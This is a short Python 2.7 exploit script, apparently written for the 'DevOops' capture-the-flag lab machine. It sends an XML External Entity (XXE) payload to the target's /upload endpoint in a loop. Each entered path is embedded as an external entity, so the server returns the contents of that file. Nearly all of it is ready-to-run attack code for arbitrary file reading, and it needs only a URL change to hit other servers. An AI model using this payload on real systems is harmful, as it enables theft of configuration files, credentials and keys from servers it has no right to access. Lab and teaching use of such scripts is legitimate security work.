#!/usr/bin/env python

import requests
import sys
import base64
import argparse

# Python 2.7
# -h to help

# Sends XML with provided payload to /upload (.91 devoops)
# XML External Entity (XXE)

URL = "http://10.10.10.91:5000/upload"

parser = argparse.ArgumentParser(description='Sends XML with provided payload to /upload (.91 devoops)')

if len(sys.argv) > 1:
	parser.print_help()
	sys.exit()

def main():
	while 1:
		path = raw_input("> ")
	
		f = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY ent SYSTEM "' + path + '">]><foo><Author>&ent;</Author><Subject>1</Subject><Content>2</Content></foo>'
		files = {'file': ('send.xml', f)}

		try:
			r = requests.post(URL, files=files)
		except:
			print "-> Error"
			continue

		print "== Response ==\n" + r.text
		
	sys.exit()

# ---

try:
	main()
except KeyboardInterrupt:
	print "\nExiting"
	sys.exit()

